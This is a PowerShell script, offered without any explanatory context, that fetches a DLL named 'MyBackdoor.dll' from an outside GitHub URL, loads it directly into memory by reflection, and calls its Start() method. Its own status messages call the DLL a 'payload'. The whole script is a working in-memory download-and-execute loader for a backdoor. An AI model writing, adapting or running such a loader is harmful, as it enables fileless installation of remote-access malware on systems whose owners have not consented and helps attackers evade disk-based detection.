# 1) Download the raw DLL bytes
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
Write-Host "[+] Downloading payload from $payloadUrl"
$dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)

# 2) Load the assembly into PowerShell’s AppDomain
Write-Host "[+] Loading assembly in-memory"
$assembly = [System.Reflection.Assembly]::Load($dllBytes)

# 3) List all types in the assembly for inspection
Write-Host "[*] Types in assembly:"
$assembly.GetTypes() | ForEach-Object { Write-Host "    $_.FullName" }

# 4) (Now that you know the exact namespace+type) invoke it:
$entryTypeName = "MyBackdoor.Entry"   # adjust this to exactly one of the names printed above
Write-Host "[+] Looking for type: $entryTypeName"
$entryType = $assembly.GetType($entryTypeName)
if (-not $entryType) {
    throw "❌ Entry type `$entryTypeName` not found. Check the printed list for the correct name."
}

$startMethod = $entryType.GetMethod("Start",[Reflection.BindingFlags] "Public,Static")
if (-not $startMethod) {
    throw "❌ Static public Start() method not found on type `$entryTypeName`."
}

Write-Host "[+] Invoking $entryTypeName.Start()"
$startMethod.Invoke($null, @())
Write-Host "[+] Payload started"
